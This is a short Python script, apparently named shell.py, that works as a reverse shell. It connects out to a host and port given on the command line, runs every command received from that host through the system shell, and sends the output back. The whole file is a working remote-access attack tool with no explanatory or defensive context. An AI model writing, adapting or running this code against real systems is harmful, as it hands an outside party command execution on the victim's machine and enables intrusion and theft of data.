import subprocess
import socket
import sys

def usage():
	print("shell.py server port")
	sys.exit()

if len(sys.argv) != 3:
	usage()
	
if sys.argv[1] == '-h':
	usage()
else:
	host = sys.argv[1]
	port = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
sock.send("[*] Connection recieved.")

while True:
	data = sock.recv(1024).strip()
	if data == 'quit': break
	proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, 
							stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	sock.send(proc.stdout.read())
